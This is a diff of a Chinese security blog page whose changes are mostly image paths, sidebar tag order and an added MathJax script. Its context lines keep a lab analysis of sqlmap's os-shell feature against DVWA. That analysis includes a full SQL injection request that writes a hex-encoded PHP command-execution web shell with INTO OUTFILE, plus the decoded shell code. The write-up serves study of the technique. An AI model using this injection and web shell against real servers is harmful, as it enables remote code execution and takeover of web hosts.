@@ -26,15 +26,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="很少用过，所以没有探究过原理，被别人问到不知怎么回答，Orz">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
 <meta property="article:published_time" content="2019-07-02T07:14:21.000Z">
 <meta property="article:modified_time" content="2020-07-16T08:03:03.233Z">
 <meta property="article:author" content="Sariel.D">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -494,7 +494,7 @@
   )
 </script>
 
-            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/assets/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
@@ -502,7 +502,7 @@
 <li>DVWA：docker <code>citizenstig/dvwa</code></li>
 </ul>
 <h2 id="0x01-流程"><a href="#0x01-流程" class="headerlink" title="0x01 流程"></a>0x01 流程</h2><p><font color="red">以下是基于 php-web 的 os-shell 流程分析</font></p>
-<h3 id="i-简单判断"><a href="#i-简单判断" class="headerlink" title="i. 简单判断"></a>i. 简单判断</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620470893105.jpg" alt="-w929"></p>
+<h3 id="i-简单判断"><a href="#i-简单判断" class="headerlink" title="i. 简单判断"></a>i. 简单判断</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620470893105.jpg" alt="-w929"></p>
 <p>从截图显示中，可以看到有以下几步</p>
 <ol>
 <li>选择 web 应用语言</li>
@@ -518,8 +518,8 @@
 
 4. id=1' LIMIT 0,1 INTO OUTFILE '/var/www/html/hackable/uploads/tmpujout.php' LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- -&amp;Submit=Submit</code></pre>
 <p>之后 sqlmap 按路径尝试去访问文件<code>tmpujqbu.php</code>，通过 POST 上传后门文件<code>tmpbzhga.php</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620490840532.jpg" alt="-w1595"></p>
-<h3 id="iii-文件内容解析"><a href="#iii-文件内容解析" class="headerlink" title="iii. 文件内容解析"></a>iii. 文件内容解析</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620487162832.jpg" alt="-w511"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620490840532.jpg" alt="-w1595"></p>
+<h3 id="iii-文件内容解析"><a href="#iii-文件内容解析" class="headerlink" title="iii. 文件内容解析"></a>iii. 文件内容解析</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620487162832.jpg" alt="-w511"></p>
 <p>可以看到tmpujqbu.php中的内容就是一个简单的文件上传，并将目标文件权限设置为 0755，注意这个文件生成利用的<code>LINES TERMINATED BY</code>，所以前面会带有之前 sql 执行的结果（这里就是<code>admin admin</code>）</p>
 <pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// tmpujqbu.php</span>
 admin    admin
@@ -608,7 +608,7 @@ admin    admin
 <span class="token punctuation">}</span>
 <span class="token keyword">print</span> <span class="token string">"&lt;pre>"</span> <span class="token punctuation">.</span> <span class="token variable">$w</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
 <p>访问并执行<code>ls</code>命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620519283346.jpg" alt="-w564"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/8dea0d95/2019-07-02-15620519283346.jpg" alt="-w564"></p>
 <h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ol>
 <li><p>原理简述</p>
 <p> 就是简单的上传一个 cmd shell</p>
@@ -1948,6 +1948,12 @@ admin    admin
         
         
         
+        
+        
+        
+        
+        
+        
     
     
     
@@ -2463,6 +2469,16 @@ admin    admin
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
         
+            <span class="sidebar-tag-name" data-tags="Mysql">
+                <span class="iconfont-archer">&#xe606;</span>
+                Mysql
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="ctf">
                 <span class="iconfont-archer">&#xe606;</span>
                 ctf
@@ -2478,11 +2494,6 @@ admin    admin
                 随笔
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Mysql">
-                <span class="iconfont-archer">&#xe606;</span>
-                Mysql
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="内网">
                 <span class="iconfont-archer">&#xe606;</span>
                 内网
@@ -2491,6 +2502,16 @@ admin    admin
             <span class="sidebar-tag-name" data-tags="RedTeam">
                 <span class="iconfont-archer">&#xe606;</span>
                 RedTeam
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="PHP">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP
             </span>
         
             <span class="sidebar-tag-name" data-tags="Burp suite">
@@ -2508,14 +2529,14 @@ admin    admin
                 extension
             </span>
         
-            <span class="sidebar-tag-name" data-tags="代码审计">
+            <span class="sidebar-tag-name" data-tags="Weblogic">
                 <span class="iconfont-archer">&#xe606;</span>
-                代码审计
+                Weblogic
             </span>
         
-            <span class="sidebar-tag-name" data-tags="PHP">
+            <span class="sidebar-tag-name" data-tags="Deserialize">
                 <span class="iconfont-archer">&#xe606;</span>
-                PHP
+                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Tomcat">
@@ -2526,21 +2547,6 @@ admin    admin
             <span class="sidebar-tag-name" data-tags="LFI">
                 <span class="iconfont-archer">&#xe606;</span>
                 LFI
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="RCE">
-                <span class="iconfont-archer">&#xe606;</span>
-                RCE
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Weblogic">
-                <span class="iconfont-archer">&#xe606;</span>
-                Weblogic
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Deserialize">
-                <span class="iconfont-archer">&#xe606;</span>
-                Deserialize
             </span>
         
             <span class="sidebar-tag-name" data-tags="Chrome">
@@ -2556,6 +2562,11 @@ admin    admin
             <span class="sidebar-tag-name" data-tags="Discuz">
                 <span class="iconfont-archer">&#xe606;</span>
                 Discuz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CodeQL">
+                <span class="iconfont-archer">&#xe606;</span>
+                CodeQL
             </span>
         
             <span class="sidebar-tag-name" data-tags="F5">
@@ -2598,14 +2609,14 @@ admin    admin
                 SQLi
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Redis">
-                <span class="iconfont-archer">&#xe606;</span>
-                Redis
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="struts">
                 <span class="iconfont-archer">&#xe606;</span>
                 struts
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                Redis
             </span>
         
             <span class="sidebar-tag-name" data-tags="SSRF">
@@ -2618,24 +2629,19 @@ admin    admin
                 ThinkPHP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="xss">
-                <span class="iconfont-archer">&#xe606;</span>
-                xss
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="XXE">
                 <span class="iconfont-archer">&#xe606;</span>
                 XXE
             </span>
         
+            <span class="sidebar-tag-name" data-tags="xss">
+                <span class="iconfont-archer">&#xe606;</span>
+                xss
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="OpenCV">
                 <span class="iconfont-archer">&#xe606;</span>
                 OpenCV
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="智能合约">
-                <span class="iconfont-archer">&#xe606;</span>
-                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="spider">
@@ -2648,14 +2654,24 @@ admin    admin
                 smali
             </span>
         
-            <span class="sidebar-tag-name" data-tags="hw2020">
+            <span class="sidebar-tag-name" data-tags="智能合约">
                 <span class="iconfont-archer">&#xe606;</span>
-                hw2020
+                智能合约
             </span>
         
             <span class="sidebar-tag-name" data-tags="深信服">
                 <span class="iconfont-archer">&#xe606;</span>
                 深信服
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Nday">
+                <span class="iconfont-archer">&#xe606;</span>
+                Nday
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="hw2020">
+                <span class="iconfont-archer">&#xe606;</span>
+                hw2020
             </span>
         
             <span class="sidebar-tag-name" data-tags="CAPTCHA">
@@ -2666,16 +2682,6 @@ admin    admin
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Nday">
-                <span class="iconfont-archer">&#xe606;</span>
-                Nday
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="CodeQL">
-                <span class="iconfont-archer">&#xe606;</span>
-                CodeQL
             </span>
         
     </div>
@@ -2689,14 +2695,14 @@ admin    admin
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="编程">
-            <span class="iconfont-archer">&#xe60a;</span>
-            编程
-        </span>
-    
         <span class="sidebar-category-name" data-categories="代码审计">
             <span class="iconfont-archer">&#xe60a;</span>
             代码审计
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="编程">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编程
         </span>
     
         <span class="sidebar-category-name" data-categories="Pentest">
@@ -2767,7 +2773,22 @@ admin    admin
         
         <!-- mermaid -->
         
-    <script>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
             window.imageLazyLoadSetting = {
                 isSPA: false,
                 processImages: null,
